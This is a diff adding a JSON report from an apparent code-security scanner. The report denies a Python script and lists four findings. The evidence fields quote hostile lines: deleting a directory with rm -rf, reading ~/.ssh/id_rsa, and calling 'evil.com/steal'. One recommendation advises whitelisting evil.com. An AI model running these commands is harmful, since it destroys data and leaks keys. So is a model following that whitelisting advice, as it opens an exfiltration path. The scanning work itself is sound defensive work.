@@ -1,0 +1,53 @@
+{
+  "tool_name": "CodeExecutor",
+  "script_type": "python",
+  "decision": "deny",
+  "risk_level": "critical",
+  "findings": [
+    {
+      "rule_id": "PY-SECRET-LEAK",
+      "category": "secret_leak",
+      "risk_level": "critical",
+      "decision": "deny",
+      "description": "Hardcoded secret (API key, token, password, private key) detected",
+      "evidence": "api_ke...def'",
+      "line_number": 8,
+      "recommendation": "Hardcoded secret detected; load secrets from environment variables or a secret manager instead."
+    },
+    {
+      "rule_id": "PY-PROCESS-SYSTEM",
+      "category": "process_system",
+      "risk_level": "high",
+      "decision": "deny",
+      "description": "Subprocess or system command execution detected",
+      "evidence": "os.system('rm -rf /tmp/project')",
+      "line_number": 5,
+      "recommendation": "Subprocess/system calls require review; prefer the SDK's built-in tool abstractions or restrict to a sandbox."
+    },
+    {
+      "rule_id": "PY-PROCESS-SYSTEM",
+      "category": "process_system",
+      "risk_level": "high",
+      "decision": "deny",
+      "description": "Subprocess or system command execution detected",
+      "evidence": "subprocess.run('cat ~/.ssh/id_rsa', shell=True)",
+      "line_number": 7,
+      "recommendation": "shell=True with a string command is vulnerable to shell injection; pass a list of arguments instead."
+    },
+    {
+      "rule_id": "PY-NETWORK-EGRESS",
+      "category": "network_egress",
+      "risk_level": "medium",
+      "decision": "needs_human_review",
+      "description": "Outbound network call to a non-whitelisted domain",
+      "evidence": "requests.get('http://evil.com/steal')",
+      "line_number": 6,
+      "recommendation": "Domain 'evil.com' is not in the whitelist. Add it to allowed_domains in the policy file."
+    }
+  ],
+  "scan_duration_ms": 2.47,
+  "script_hash": "bf226967b8742adcb3e27d42d645a00d5dfab6a0fa82dfef8dab45de4479a5cb",
+  "sanitized": true,
+  "timestamp": "2026-07-12T09:09:37.560890+00:00",
+  "summary": "Decision: deny (risk: critical). Detected 4 finding(s): network_egress, process_system, secret_leak"
+}
